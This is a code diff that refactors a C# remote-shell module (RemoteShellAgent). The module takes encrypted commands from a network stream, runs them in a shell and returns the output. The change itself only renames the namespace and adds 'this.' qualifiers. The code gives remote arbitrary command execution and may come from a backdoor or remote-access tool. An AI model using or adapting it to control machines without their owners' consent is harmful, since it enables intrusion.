@@ -4,7 +4,7 @@ using System.Text;
 using System.Threading;
 using bc.srv.Classes.Comunicator;
 
-namespace bc.srv.Muduli.Remote_Shell
+namespace bc.srv.Modules.Remote_Shell
 {
     internal class RemoteShellAgent
     {
@@ -22,16 +22,16 @@ namespace bc.srv.Muduli.Remote_Shell
 
         public RemoteShellAgent(NetworkStream clientStream)
         {
-            myStream = clientStream;
-            mm = new MsgManager(clientStream);
+            this.myStream = clientStream;
+            this.mm = new MsgManager(clientStream);
 
-            sw = new ShellWorker();
+            this.sw = new ShellWorker();
 
             //EVENTI
-            sw.StdOut += RemShell_StdOut;
-            sw.StdError += RemShell_StdError;
+            this.sw.StdOut += this.RemShell_StdOut;
+            this.sw.StdError += RemShell_StdError;
 
-            sCmdEnd = sw.SCmdComplete; // COMANDO DI CONCLUSIONE
+            this.sCmdEnd = this.sw.SCmdComplete; // COMANDO DI CONCLUSIONE
         }
 
         /// <summary>
@@ -39,7 +39,7 @@ namespace bc.srv.Muduli.Remote_Shell
         /// </summary>
         public void StartShellListener()
         {
-            var t = new Thread(ShellListener);
+            var t = new Thread(this.ShellListener);
             t.IsBackground = true;
             t.Start();
         }
@@ -50,14 +50,14 @@ namespace bc.srv.Muduli.Remote_Shell
         /// </summary>
         private void ShellListener()
         {
-            while (SrvData.Instance.isConnected && !stopListener)
+            while (SrvData.Instance.isConnected && !this.stopListener)
                 try
                 {
                     Thread.Sleep(10);
 
-                    var cmd = mm.WaitForEncryMessageRicorsive(10000);
+                    var cmd = this.mm.WaitForEncryMessageRicorsive(10000);
 
-                    if (stopListener)
+                    if (this.stopListener)
                         break;
 
                     if (cmd != "TIMEOUT" && cmd != "__ERROR__")
@@ -67,12 +67,12 @@ namespace bc.srv.Muduli.Remote_Shell
                         switch (cmdSplit[0])
                         {
                             case "EXEC":
-                                RunCmd(cmdSplit[1]);
+                                this.RunCmd(cmdSplit[1]);
                                 break;
 
                             case "EXIT":
-                                RunCmd("EXIT");
-                                stopListener = true;
+                                this.RunCmd("EXIT");
+                                this.stopListener = true;
                                 break;
                         }
                     }
@@ -83,13 +83,13 @@ namespace bc.srv.Muduli.Remote_Shell
 
             // ARRIVO QUI PERCHè IL LISTENER è MORTO
 
-            if (SrvData.Instance.nsListaCanali.Contains(myStream))
-                SrvData.Instance.nsListaCanali.Remove(myStream);
+            if (SrvData.Instance.nsListaCanali.Contains(this.myStream))
+                SrvData.Instance.nsListaCanali.Remove(this.myStream);
 
 
             try
             {
-                myStream.Close();
+                this.myStream.Close();
             }
             catch
             {
@@ -106,8 +106,8 @@ namespace bc.srv.Muduli.Remote_Shell
         {
             try
             {
-                sLastOutPut = new StringBuilder();
-                sw.Execute(cmd);
+                this.sLastOutPut = new StringBuilder();
+                this.sw.Execute(cmd);
             }
             catch
             {
@@ -121,7 +121,7 @@ namespace bc.srv.Muduli.Remote_Shell
         {
             try
             {
-                mm.SendLargeEncryMessage(sLastOutPut.ToString(), 10000);
+                this.mm.SendLargeEncryMessage(this.sLastOutPut.ToString(), 10000);
             }
             catch
             {
@@ -137,10 +137,10 @@ namespace bc.srv.Muduli.Remote_Shell
         {
             var line = e.Data;
 
-            if (line != sw.SCmdComplete)
-                sLastOutPut.AppendLine(line);
+            if (line != this.sw.SCmdComplete)
+                this.sLastOutPut.AppendLine(line);
             else
-                SendAnswer();
+                this.SendAnswer();
         }
 
         private static void RemShell_StdError(object sender, DataReceivedEventArgs e)
